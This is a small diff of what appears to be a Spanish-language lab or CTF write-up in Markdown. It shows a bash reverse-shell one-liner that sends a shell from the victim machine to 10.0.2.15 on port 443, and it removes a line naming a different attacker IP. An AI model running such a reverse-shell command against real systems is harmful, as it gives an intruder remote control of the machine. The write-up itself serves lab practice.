@@ -14,7 +14,7 @@ Y nos enviamos desde la máquina víctima una reverse shell para acceder:
 bash -c "bash -i >&/dev/tcp/10.0.2.15/443 0>&1" 
 ```
 
-(Siendo la 192.168.1.39 mi IP de la máquina atacante)
+
 
 ---
 
